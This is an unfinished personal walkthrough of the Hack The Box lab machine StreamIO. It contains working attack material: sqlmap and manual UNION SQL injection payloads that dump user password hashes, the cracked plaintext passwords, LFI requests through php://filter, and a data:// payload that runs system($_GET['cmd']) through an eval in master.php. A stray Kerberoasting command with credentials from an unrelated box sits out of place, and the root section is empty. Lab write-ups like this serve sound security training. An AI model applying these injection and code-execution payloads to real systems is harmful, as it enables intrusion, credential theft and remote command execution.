# how-to-streamio.htb
![[Pasted image 20220628091252.png]]

# USER
### Step 1
**nmap:**
```bash
➜  streamio nmap -Pn -n -p- -v 10.10.11.158
PORT   STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49701/tcp open  unknown
50436/tcp open  unknown


➜  streamio nmap -Pn -n -p53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49701,50436 -sCV 10.10.11.158   
PORT   STATE SERVICE VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-28 15:05:15Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
|_ssl-date: 2022-06-28T15:06:45+00:00; +7h00m00s from scanner time.
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
50436/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows



➜  streamio sudo nmap -sU -v 10.10.11.158 -Pn --top-port=100
PORT    STATE SERVICE
53/udp  open  domain
123/udp open  ntp
```

- Domain: streamIO.htb
- Vhost: watch.streamIO.htb

Going through the website, https://streamio.htb, we find an email address in the footer - **oliver@streamio.htb**.
In the "about us" section we find two more users, **Barry** and **Samantha**.

**FFUF**:
```bash
➜  streamio ffuf -c -w /usr/share/wordlists/dirb/big.txt -u https://streamio.htb/FUZZ 
[... snip ...]
ADMIN                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 31ms]
Admin                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 29ms]
Images                  [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 29ms]
admin                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 28ms]
css                     [Status: 301, Size: 148, Words: 9, Lines: 2, Duration: 29ms]
favicon.ico             [Status: 200, Size: 1150, Words: 4, Lines: 1, Duration: 29ms]
fonts                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 33ms]
images                  [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 28ms]
js                      [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 30ms]

➜  streamio ffuf -c -w /usr/share/wordlists/dirb/big.txt -u https://streamio.htb/admin/FUZZ.php
[... snip ...]
Index                   [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 33ms]
index                   [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 32ms]
master                  [Status: 200, Size: 58, Words: 5, Lines: 2, Duration: 40ms]
```

```bash
➜  streamio curl -k https://streamio.htb/admin/master.php
<h1>Movie managment</h1>
Only accessable through includes%
```

Maybe we'll find a include parameter which we controll, and can call `https://streamio.htb/admin/master.php` ?

We can't bypass the 403 to access any admin-page. The signup function of the site doesn't seem to do anything, we can "create" an account but can't login with it. The signup nor the login is vulnerable to sqli. Move on to the vhost, `watch.streamio.htb`.

```bash
➜  streamio ffuf -c -w /usr/share/wordlists/dirb/big.txt -u https://watch.streamio.htb/FUZZ.php               
[... snip ...]
Index                   [Status: 200, Size: 2829, Words: 202, Lines: 79, Duration: 33ms]
Search                  [Status: 200, Size: 253887, Words: 12366, Lines: 7194, Duration: 88ms]
blocked                 [Status: 200, Size: 677, Words: 28, Lines: 20, Duration: 32ms]
index                   [Status: 200, Size: 2829, Words: 202, Lines: 79, Duration: 36ms]
search                  [Status: 200, Size: 253887, Words: 12366, Lines: 7194, Duration: 50ms]
```
At `https://watch.streamio.htb/search.php` we find all of the movies, however we are met with an error when trying to watch any of them. 

We have a lot of different input fields and it would be wise to test SQLi on ..
.. login at `streamio.htb/login.php`
.. email subscription at `watch.streamio.htb`
.. search at `watch.streamio.htb/search.php`

```bash
## LOGIN
➜  streamio sqlmap -r req-login.txt --dbs --threads 5 --force-ssl
[... snip ...]
[11:52:15] [INFO] (custom) POST parameter '#1*' appears to be 'Microsoft SQL Server/Sybase stacked queries (comment)' injectable 
sqlmap identified the following injection point(s) with a total of 66 HTTP(s) requests:
---
Parameter: #1* ((custom) POST)
    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: username=';WAITFOR DELAY '0:0:5'--&password=asdf'
---
available databases [5]:
[*] model
[*] msdb
[*] STREAMIO
[*] streamio_backup
[*] tempdb

## EMAIL
➜  streamio sqlmap -r req-email.txt --dbs --threads 5 --force-ssl
[... snip ...]
[11:59:45] [CRITICAL] all tested parameters do not appear to be injectable.]

## SEARCH
➜  streamio sqlmap -r req-search.txt --dbs --threads 5 --force-ssl
[... snip ...]
[12:01:57] [CRITICAL] all tested parameters do not appear to be injectable.
```

### Step 2
We have a timed injection in the username parameter of the login page. Continue to enumerate tables of database `STREAMIO`.

```bash
➜  streamio sqlmap -r req-login.txt -D STREAMIO --tables --force-ssl
[... snip ...]
[12:11:46] [INFO] retrieved: dbo.movies
[12:11:46] [INFO] retrieved: dbo.users
Database: STREAMIO
[2 tables]
+--------+
| movies |
| users  |
+--------+

➜  streamio sqlmap -r req-login.txt -D STREAMIO -T dbo.users --dump --force-ssl
[... snip ...]
[12:14:05] [INFO] retrieved: is_staff
[12:14:47] [INFO] retrieved: password
[12:15:29] [INFO] retrieved: username

+----+----------+----------------------------------------------------+----------------------------------------------------+
| id | is_staff | password                                           | username                                           |
+----+----------+----------------------------------------------------+----------------------------------------------------+
| 3  | 1        | c660060492d9edcaa8332d89c99c9239                   | James                                              |
| 4  | 1        | 925e5408ecb67aea449373d668b7359e                   | Theodore                                           |
| 5  | 1        | 083ffae904143c4796e464dac33c1f7d                   | Samantha                                           |
| 6  | 1        | 08344b85b329d7efd611b7a7743e8a09                   | Lauren                                             |
| 7  | 1        | d62be0dc82071bccc1322d64ec5b6c51                   | William                                            |
| 8  | 1        | f87d3c0d6c8fd686aacc6627f1f493a5                   | Sabrina                                            |
| 9  | 1        | f03b910e2bd0313a23fdd7575f34a694                   | Robert                                             |
| 10 | 1        | 3577c47eb1e12c8ba021611e1280753c                   | Thane                                              |
+----+----------+----------------------------------------------------+----------------------------------------------------+

LAUREN = 08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
SABRINA = f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$ 
```

The dump is time-based which takes ages, so after about two hours I stop sqlmap and look for other ways in. Of the 10 hashes collected we're able to crack two - however they don't lead to anything.

Shifting focus to `watch.streamio.htb/search.php` I notice that the user input isn't parameterized. If I search for `1` I get all movies containing 1, however if I search for `1';-- -` I only get all movies **ENDING** with 1, and they are sorted by release date.

With that information I assume the original query is something like this:
```sql
## ASSUMED ORIGINAL QUERY
SELECT Name, ReleaseDate FROM STREAMIO.movies
WHERE Name = 'INPUT-DATA'
ORDER BY Name ASC;
```

Playing around with SQLi and `UNION SELECT @@version` we can ennumerate the number of columns, example:
```sql
' UNION SELECT @@version
' UNION SELECT @@version,2
' UNION SELECT 1,@@version
' UNION SELECT @@version,2,3
' UNION SELECT 1,@@version,3
' UNION SELECT 1,2,@@version
...
```

At 6 columns we get the response we're looking for:
```sql
## REQUEST
q=1' UNION SELECT 1,@@version,3,4,5,6;-- -

'## RESPONSE
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
	Sep 24 2019 13:48:23 
	Copyright (C) 2019 Microsoft Corporation
	Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
```

With this injection, and previously known database information, we are now able to extract the entire user database.

```http
### REQUEST
POST /search.php HTTP/2
Host: watch.streamio.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 77
Origin: https://watch.streamio.htb
Referer: https://watch.streamio.htb/search.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

q=1' UNION SELECT 1,concat(username,':',password),3,4,5,6 from dbo.users;-- -
```
Copy the output to a file, and with some bash magic we can make a list of all users and it's corresponding hash.
```bash
➜  streamio cat sqli-out.txt| awk -F " " '{print $2,$3}' | cut -d'>' -f2 | sort -u | grep " :" | sed 's/ //g'
admin:665a50ac9eaa781e4f7f04199db97a11
Alexendra:1c2b3d8270321140e5153f6637d3ee53
asdasd:7815696ecbf1c96e6894b779456d330e
Austin:0049ac57646627b8d7aeaccf8b6a936f
Barbra:3961548825e3e21df5646cafe11c6c76
Barry:54c88b2dbd7b1a84012fabc1a4c73415
Baxter:22ee218331afd081b0dcd8115284bae3
Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8
Carmon:35394484d89fcfdb3c5e447fe749d213
Clara:ef8f3d30a856cf166fb8215aca93e9ff
:d41d8cd98f00b204e9800998ecf8427e
Diablo:ec33265e5fc8c2f1b0c137bb7b3632b5
Garfield:8097cedd612cc37c29db152b6e9edbd3
Gloria:0cfaaaafb559f081df2befbe66686de0
James:c660060492d9edcaa8332d89c99c9239
Juliette:6dcd87740abb64edfa36d170f0d5450d
Lauren:08344b85b329d7efd611b7a7743e8a09
Lenord:ee0b8a0937abd60c2882eacb2f8dc49f
Lucifer:7df45a9e3de3863807c026ba48e55fb3
mat:43b0494e505be040c691856c67385ec6
mat:4a258d930b7d3409982d727ddbb4ba88
mattt:7b8a3544637ef0e8fd2859095876e461
mca:43b0494e505be040c691856c67385ec6
mca:7b8a3544637ef0e8fd2859095876e461
Michelle:b83439b16f844bd6ffe35c02fe21b3c0
oliver:25ed1bcb423b0b7200f485fc5ff71c8e
Oliver:fd78db29173a5cf701bd69027cb9bf6b
Robert:f03b910e2bd0313a23fdd7575f34a694
Robin:dc332fb5576e9631c9dae83f194f8e70
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5
Samantha:083ffae904143c4796e464dac33c1f7d
Stan:384463526d288edcc95fc3701e523bc7
Thane:3577c47eb1e12c8ba021611e1280753c
Theodore:925e5408ecb67aea449373d668b7359e
Victor:bf55e15b119860a6e6b5a164377da719
Victoria:b22abb47a02b52d5dfa27fb0b534f693
William:d62be0dc82071bccc1322d64ec5b6c51
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332
```

Crack the hashes with hashcat
```bash
➜  streamio hashcat -a0 -m0 hashes.txt /usr/share/wordlists/rockyou.txt --user
➜  streamio hashcat -a0 -m0 hashes.txt /usr/share/wordlists/rockyou.txt --user --show
admin:665a50ac9eaa781e4f7f04199db97a11:paddpadd
asdasd:7815696ecbf1c96e6894b779456d330e:asd
Barry:54c88b2dbd7b1a84012fabc1a4c73415:$hadoW
Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$
Clara:ef8f3d30a856cf166fb8215aca93e9ff:%$clara
d41d8cd98f00b204e9800998ecf8427e:
Juliette:6dcd87740abb64edfa36d170f0d5450d:$3xybitch
Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
Lenord:ee0b8a0937abd60c2882eacb2f8dc49f:physics69i
mat:4a258d930b7d3409982d727ddbb4ba88:mat
Michelle:b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123
oliver:25ed1bcb423b0b7200f485fc5ff71c8e:zz
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
Thane:3577c47eb1e12c8ba021611e1280753c:highschoolmusical
Victoria:b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
```

--------------
### Step 3
Testing all the credentials on `https://streamio.htb/login.php` we find that only `yoshihide:66boysandgirls..` works. 
As `yoshihide` we are able to visit `https://streamio.htb/admin` and can manage users, staff, movies and "leave a message for admin". 

![[Pasted image 20220701131010.png]]

With our admin credentials we re-enumerate `/admin/` and we find a new url-parameter `debug`
```bash
➜  streamio ffuf -c -w /usr/share/wordlists/dirb/big.txt -u https://streamio.htb/admin/\?FUZZ\= -b "PHPSESSID=ciku9juef85i9sj1eju4alj375"  -fs 1678
[... snip ...]
debug                   [Status: 200, Size: 1712, Words: 90, Lines: 50, Duration: 33ms]
movie                   [Status: 200, Size: 320235, Words: 15986, Lines: 10791, Duration: 112ms]
staff                   [Status: 200, Size: 12484, Words: 1784, Lines: 399, Duration: 40ms]
user                    [Status: 200, Size: 8009, Words: 1142, Lines: 255, Duration: 63ms]
```

A quick look onto `debug` and we find that it's vulnerable to LFI:
```http
## REQUEST
GET /admin/?debug=c%3a%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=ciku9juef85i9sj1eju4alj375
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close

## RESPONSE
HTTP/2 200 OK
[... snip ...]
			this option is for developers only# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#	127.0.0.1       localhost
#	::1             localhost
127.0.0.1	watch.streamio.htb streamio.htb
```

It is also possible to execute `.exe` files however I can't get any reverse shell. Looking on `master.php`, that we found earlier, doesn't really give anything of use either..

-------------------
### Step 4
Tinkering around with the LFI I came to think of `php://filter`, we should be able to extract the code of the known files to see if there are any vulnerable functions that we can exploit.

```bash
➜  streamio curl -k --cookie "PHPSESSID=ciku9juef85i9sj1eju4alj375" https://streamio.htb/admin/\?debug\=php://filter/convert.base64-encode/resource\=master.php 
[... snip ...]
PGgxPk1vdmllIG1hbmFnbWVudDwvaDE+DQo8P3BocA0KaWYoIWRlZmluZWQoJ2luY2x1ZGVkJykpDQoJZGllKCJPbmx5IGFjY2Vzc2FibGUgdGhyb3VnaCBpbmNsdWRlcyIpOw0KaWYoaXNzZXQoJF9QT1NUWydtb3ZpZV9pZCddKSkNCnsNCiRxdWVyeSA9ICJkZWxldGUgZnJvbSBtb3ZpZXMgd2hlcmUgaWQgPSAiLiRfUE9TVFsnbW92aWVfaWQnXTsNCiRyZXMgPSBzcWxzcnZfcXVlcnkoJGhhbmRsZSwgJHF1ZXJ5LCBhcnJheSgpLCBhcnJheSgiU2Nyb2xsYWJsZSI9PiJidWZmZXJlZCIpKTsNCn0NCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIG1vdmllcyBvcmRlciBieSBtb3ZpZSI7DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp3aGlsZSgkcm93ID0gc3Fsc3J2X2ZldGNoX2FycmF5KCRyZXMsIFNRTFNSVl9GRVRDSF9BU1NPQykpDQp7DQo/Pg0KDQo8ZGl2Pg0KCTxkaXYgY2xhc3M9ImZvcm0tY29udHJvbCIgc3R5bGU9ImhlaWdodDogM3JlbTsiPg0KCQk8aDQgc3R5bGU9ImZsb2F0OmxlZnQ7Ij48P3BocCBlY2hvICRyb3dbJ21vdmllJ107ID8+PC9oND4NCgkJPGRpdiBzdHlsZT0iZmxvYXQ6cmlnaHQ7cGFkZGluZy1yaWdodDogMjVweDsiPg0KCQkJPGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249Ij9tb3ZpZT0iPg0KCQkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Im1vdmllX2lkIiB2YWx1ZT0iPD9waHAgZWNobyAkcm93WydpZCddOyA/PiI+DQoJCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tc20gYnRuLXByaW1hcnkiIHZhbHVlPSJEZWxldGUiPg0KCQkJPC9mb3JtPg0KCQk8L2Rpdj4NCgk8L2Rpdj4NCjwvZGl2Pg0KPD9waHANCn0gIyB3aGlsZSBlbmQNCj8+DQo8YnI+PGhyPjxicj4NCjxoMT5TdGFmZiBtYW5hZ21lbnQ8L2gxPg0KPD9waHANCmlmKCFkZWZpbmVkKCdpbmNsdWRlZCcpKQ0KCWRpZSgiT25seSBhY2Nlc3NhYmxlIHRocm91Z2ggaW5jbHVkZXMiKTsNCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIHVzZXJzIHdoZXJlIGlzX3N0YWZmID0gMSAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0KaWYoaXNzZXQoJF9QT1NUWydzdGFmZl9pZCddKSkNCnsNCj8+DQo8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1zdWNjZXNzIj4gTWVzc2FnZSBzZW50IHRvIGFkbWluaXN0cmF0b3I8L2Rpdj4NCjw/cGhwDQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDEiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic3RhZmZfaWQiIHZhbHVlPSI8P3BocCBlY2hvICRyb3dbJ2lkJ107ID8+Ij4NCgkJCQk8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tcHJpbWFyeSIgdmFsdWU9IkRlbGV0ZSI+DQoJCQk8L2Zvcm0+DQoJCTwvZGl2Pg0KCTwvZGl2Pg0KPC9kaXY+DQo8P3BocA0KfSAjIHdoaWxlIGVuZA0KPz4NCjxicj48aHI+PGJyPg0KPGgxPlVzZXIgbWFuYWdtZW50PC9oMT4NCjw/cGhwDQppZighZGVmaW5lZCgnaW5jbHVkZWQnKSkNCglkaWUoIk9ubHkgYWNjZXNzYWJsZSB0aHJvdWdoIGluY2x1ZGVzIik7DQppZihpc3NldCgkX1BPU1RbJ3VzZXJfaWQnXSkpDQp7DQokcXVlcnkgPSAiZGVsZXRlIGZyb20gdXNlcnMgd2hlcmUgaXNfc3RhZmYgPSAwIGFuZCBpZCA9ICIuJF9QT1NUWyd1c2VyX2lkJ107DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idXNlcl9pZCIgdmFsdWU9Ijw/cGhwIGVjaG8gJHJvd1snaWQnXTsgPz4iPg0KCQkJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXNtIGJ0bi1wcmltYXJ5IiB2YWx1ZT0iRGVsZXRlIj4NCgkJCTwvZm9ybT4NCgkJPC9kaXY+DQoJPC9kaXY+DQo8L2Rpdj4NCjw/cGhwDQp9ICMgd2hpbGUgZW5kDQo/Pg0KPGJyPjxocj48YnI+DQo8Zm9ybSBtZXRob2Q9IlBPU1QiPg0KPGlucHV0IG5hbWU9ImluY2x1ZGUiIGhpZGRlbj4NCjwvZm9ybT4NCjw/cGhwDQppZihpc3NldCgkX1BPU1RbJ2luY2x1ZGUnXSkpDQp7DQppZigkX1BPU1RbJ2luY2x1ZGUnXSAhPT0gImluZGV4LnBocCIgKSANCmV2YWwoZmlsZV9nZXRfY29udGVudHMoJF9QT1NUWydpbmNsdWRlJ10pKTsNCmVsc2UNCmVjaG8oIiAtLS0tIEVSUk9SIC0tLS0gIik7DQp9DQo/Pg==

➜  streamio echo "PGgxPk1.." | base64 -d
[... snip ...]
<h1>Movie managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
if(isset($_POST['movie_id']))
{
$query = "delete from movies where id = ".$_POST['movie_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from movies order by movie";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['movie']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST" action="?movie=">
				<input type="hidden" name="movie_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>Staff managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
$query = "select * from users where is_staff = 1 ";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
if(isset($_POST['staff_id']))
{
?>
<div class="alert alert-success"> Message sent to administrator</div>
<?php
}
$query = "select * from users where is_staff = 1";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['username']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST">
				<input type="hidden" name="staff_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>User managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
if(isset($_POST['user_id']))
{
$query = "delete from users where is_staff = 0 and id = ".$_POST['user_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from users where is_staff = 0";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['username']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST">
				<input type="hidden" name="user_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<form method="POST">
<input name="include" hidden>
</form>
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>% 
```
At the end we find a vulnerable function:
```php
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
```

```bash
➜  streamio echo "c3lzdGVtKCRfR0VUWydjbWQnXSk7" | base64 -d
system($_GET['cmd']);%

➜  streamio curl -k --cookie "PHPSESSID=ciku9juef85i9sj1eju4alj375" --data-binary "include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7" https://streamio.htb/admin/\?debug\=master.php\&cmd\=ls
```


``GetUserSPNs search.htb/Hope.Sharp:IsolationIsKey? -request``

----------------

# ROOT
### Step 1






-----------------

# Referenses
MsSQL SELECT:
https://docs.microsoft.com/en-us/sql/t-sql/queries/select-examples-transact-sql?view=sql-server-ver16

MsSQL Concat: 
https://www.sqlservertutorial.net/sql-server-string-functions/sql-server-concat_ws-function/#:~:text=The%20SQL%20Server%20CONCAT_WS()%20function%20concatenates%20two%20or%20more,()%20means%20concatenate%20with%20separator.&text=In%20this%20syntax%3A,NCHAR%20%2C%20VARCHAR%20%2C%20or%20NVARCHAR%20.
